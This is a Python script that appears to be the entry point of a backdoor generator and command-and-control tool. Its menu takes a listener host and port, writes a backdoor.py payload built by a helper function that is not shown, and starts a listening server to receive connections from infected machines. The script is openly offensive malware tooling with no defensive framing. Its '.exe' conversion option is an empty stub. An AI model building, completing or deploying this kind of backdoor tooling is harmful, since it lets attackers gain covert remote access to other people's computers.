from server import start_server
from os import system
import utils


utils.draw_animation()
utils.draw_main_menu()

while True:
    choice = input(">> ")

    if choice == '1':
        lhost = input("Type the listener host address >> ")
        lport = input("Type the listener port >> ")
        convert = input("Do you want to convert the backdoor to .exe ? (y/n) >> ").lower()
        if (convert == 'y'):
            pass
        else:
            file = open("backdoor.py", "w")
            string_code = utils.generate_backdoor_code(lhost, lport)
            file.write(string_code)
            file.close()
        

        system("clear")
        utils.draw_main_menu()
        print("\n[+] - Backdoor was generated!\n")
    elif choice == '2':
        lhost = input("Type the listener host address >> ")
        while True:
            try:
                lport = int(input("Type the listener port >> "))
                if (lport > 65536 or lport == 0):
                    print('[-] Unavailable port!')
                else:
                    break
            except:
                print("[-] Only numbers are accepted for the port!")
            
        start_server(lhost, lport)
        break
    elif choice == '0':
        print("Good bye...")
        break
    else:
        system("clear")
        utils.draw_main_menu()
        print("[-] Invalid option\n")
